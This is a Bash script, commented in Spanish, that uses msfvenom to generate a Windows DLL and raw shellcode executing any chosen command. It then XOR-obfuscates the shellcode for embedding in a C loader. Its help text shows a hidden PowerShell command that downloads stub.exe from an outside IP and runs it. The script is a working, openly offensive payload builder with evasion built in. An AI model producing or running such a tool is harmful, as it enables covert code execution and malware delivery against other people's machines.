#!/bin/bash
# === gen_cmd_dll.sh v1.0 ===
# Genera DLL y shellcode ofuscado para ejecutar un comando
# Uso: ./gen_cmd_dll.sh --cmd "powershell..." [--key 0x33] [--output payload]

set -euo pipefail

# === CONFIGURACIÓN POR DEFECTO ===
CMD=""
OUTPUT="payload"
XOR_KEY_HEX="0x33"
XOR_KEY_DEC=51
SHELLCODE_BIN="payload.bin"
DLL_OUTPUT="payload.dll"
OBFUSCATED_SC="shellcode_xor.txt"

# === FUNCIONES ===
show_help() {
    cat << EOF
Uso: $0 [opciones]

Opciones:
  --cmd CMD               Comando a empaquetar (ej: 'powershell -enc ...')
  --key HEX               Clave XOR en hex (por defecto: $XOR_KEY_HEX)
  --output NAME           Nombre base de salida (genera NAME.dll y NAME.bin)
  -h, --help              Muestra esta ayuda

Ejemplo:
  $0 --cmd 'powershell.exe -nop -w hidden -c "IWR http://10.10.14.91/stub.exe -OutFile stub.exe; Start-Process stub.exe"' --key 0x33 --output maldll
EOF
    exit 0
}

# Función para ofuscar binario con XOR y convertir a \x..
xor_obfuscate() {
    local input_bin="$1"
    local key_hex="$2"
    local key_dec=$(printf "%d" "$key_hex" 2>/dev/null) || { echo "[-] Clave XOR inválida: $key_hex" >&2; exit 1; }
    local tmp_hex=$(mktemp)

    # Convertir binario a hex plano
    xxd -p -c 20000 "$input_bin" | tr -d '\n' > "$tmp_hex"

    # Aplicar XOR y generar formato \x..
    python3 -c "
key = $key_dec
with open('$tmp_hex', 'r') as f:
    hex_str = f.read().strip()
bytes_list = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]
for b in bytes_list:
    if len(b) == 2:
        val = int(b, 16)
        xor_val = val ^ key
        print(f'\\\\x{xor_val:02x}', end='')
print()
" 

    # Limpiar
    rm -f "$tmp_hex"
}

# === PROCESAR ARGUMENTOS ===
while [[ $# -gt 0 ]]; do
    case $1 in
        --cmd)
            CMD="$2"
            shift 2
            ;;
        --key)
            XOR_KEY_HEX="$2"
            XOR_KEY_DEC=$(printf "%d" "$XOR_KEY_HEX" 2>/dev/null) || { echo "[-] Clave XOR inválida: $XOR_KEY_HEX"; exit 1; }
            if ! [[ "$XOR_KEY_DEC" =~ ^[0-9]+$ ]]; then
                echo "[-] Clave XOR no es un número válido."
                exit 1
            fi
            shift 2
            ;;
        --output)
            OUTPUT="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            ;;
        *)
            echo "Error: opción desconocida: $1"
            echo "Use --help para ver las opciones."
            exit 1
            ;;
    esac
done

# === VALIDACIÓN ===
if [[ -z "$CMD" ]]; then
    echo "[-] Falta el comando (--cmd). Usa --help para ver el uso."
    exit 1
fi

# Ajustar nombres de salida
DLL_OUTPUT="${OUTPUT}.dll"
SHELLCODE_BIN="${OUTPUT}.bin"
OBFUSCATED_SC="${OUTPUT}_shellcode.txt"

# === 1. Generar DLL con msfvenom ===
echo "[+] Generando DLL con comando: $CMD"
msfvenom -p windows/x64/exec CMD="$CMD" -f dll -o "$DLL_OUTPUT" >/dev/null 2>&1 || {
    echo "[-] Error al generar DLL con msfvenom. ¿Tienes Metasploit instalado?"
    exit 1
}

# === 2. Generar shellcode RAW (.bin) ===
echo "[+] Generando shellcode RAW (.bin)"
msfvenom -p windows/x64/exec CMD="$CMD" -f raw -o "$SHELLCODE_BIN" >/dev/null 2>&1 || {
    echo "[-] Error al generar shellcode RAW."
    exit 1
}

# === 3. Ofuscar shellcode con XOR ===
echo "[+] Ofuscando shellcode con XOR key: $XOR_KEY_HEX ($XOR_KEY_DEC)"
xor_obfuscate "$SHELLCODE_BIN" "$XOR_KEY_HEX" > "$OBFUSCATED_SC"

# === 4. Resumen final ===
echo ""
echo "[+] ✅ Generación completada:"
echo "    DLL:              $DLL_OUTPUT"
echo "    Shellcode RAW:    $SHELLCODE_BIN"
echo "    Shellcode XOR:    $OBFUSCATED_SC (clave: $XOR_KEY_HEX)"
echo ""
echo "[*] Usa el shellcode ofuscado en tu cargador (C, C++, etc)"
echo "[*] Ejemplo de uso en C: unsigned char sc[] = $(cat $OBFUSCATED_SC);"